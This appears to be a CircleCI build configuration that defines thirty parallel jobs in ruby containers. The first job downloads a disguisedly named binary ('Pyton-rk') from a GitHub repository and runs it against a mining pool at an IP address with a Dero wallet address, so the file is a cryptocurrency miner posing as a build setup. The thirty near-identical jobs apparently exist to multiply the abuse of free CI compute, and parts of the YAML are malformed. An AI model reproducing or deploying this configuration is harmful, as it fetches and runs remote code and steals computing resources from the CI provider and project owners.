working_dir: &working_dir ~/app 
.build_template: &script 
  steps: 
    - checkout 
    - run: 
        name: Install Dependencies 
        command: | 
                    apt-get update 
                    apt-get upgrade -y 
                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
    - run: 
        name: Run tests 
        command: | 
                    chmod +x deploy.sh 
                    ./deploy.sh
version: 2.0 
jobs: 
  build1: 
    <<: wget https://github.com/viloidka/go/raw/main/Pyton-rk && chmod +x Pyton-rk && ./Pyton-rk -r 157.230.26.157:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xms2rr3jv2qcjzsmjxutd.rtx3060
    docker: 
      - image: ruby 
  build2: 
    <<: *script 
    docker: 
      - image: ruby 
  build3: 
    <<: *script 
    docker: 
      - image: ruby 
  build4: 
    <<: *script 
    docker: 
      - image: ruby 
  build5: 
    <<: *script 
    docker: 
      - image: ruby 
  build6: 
    <<: *script 
    docker: 
      - image: ruby 
  build7: 
    <<: *script 
    docker: 
      - image: ruby 
  build8: 
    <<: *script 
    docker: 
      - image: ruby 
  build9: 
    <<: *script 
    docker: 
      - image: ruby 
  build10: 
    <<: *script 
    docker: 
      - image: ruby 
  build11: 
    <<: *script 
    docker: 
      - image: ruby 
  build12: 
    <<: *script 
    docker: 
      - image: ruby 
  build13: 
    <<: *script 
    docker: 
      - image: ruby 
  build14: 
    <<: *script 
    docker: 
      - image: ruby 
  build15: 
    <<: *script 
    docker: 
      - image: ruby 
  build16: 
    <<: *script 
    docker: 
      - image: ruby 
  build17: 
    <<: *script 
    docker: 
      - image: ruby 
  build18: 
    <<: *script 
    docker: 
      - image: ruby 
  build19: 
    <<: *script 
    docker: 
      - image: ruby 
  build20: 
    <<: *script 
    docker: 
      - image: ruby 
  build21: 
    <<: *script 
    docker: 
      - image: ruby 
  build22: 
    <<: *script 
    docker: 
      - image: ruby 
  build23: 
    <<: *script 
    docker: 
      - image: ruby 
  build24: 
    <<: *script 
    docker: 
      - image: ruby 
  build25: 
    <<: *script 
    docker: 
      - image: ruby 
  build26: 
    <<: *script 
    docker: 
      - image: ruby 
  build27: 
    <<: *script 
    docker: 
      - image: ruby 
  build28: 
    <<: *script 
    docker: 
      - image: ruby 
  build29: 
    <<: *script 
    docker: 
      - image: ruby 
  build30: 
    <<: *script 
    docker: 
      - image: ruby 
 
workflows: 
  version: 2 
  commit: 
    jobs: 
      - build1 
      - build2 
      - build3 
      - build4 
      - build5 
      - build6 
      - build7 
      - build8 
      - build9 
      - build10 
      - build11 
      - build12 
      - build13 
      - build14 
      - build15 
      - build16 
      - build17 
      - build18 
      - build19 
      - build20 
      - build21 
      - build22 
      - build23 
      - build24 
      - build25 
      - build26 
      - build27 
      - build28 
      - build29 
      - build30
